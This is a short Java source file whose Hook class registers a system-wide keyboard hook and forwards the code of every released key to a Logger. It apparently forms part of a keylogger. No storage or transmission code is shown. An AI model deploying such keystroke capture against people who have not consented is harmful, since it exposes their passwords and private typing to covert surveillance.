package main;

import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;

public class Hook {

	public Hook(Logger logger) {
		GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true);

		keyboardHook.addKeyListener(new GlobalKeyAdapter() {

			@Override
			public void keyReleased(GlobalKeyEvent event) {
				logger.press(event.getVirtualKeyCode());
			}
		});
	}
}
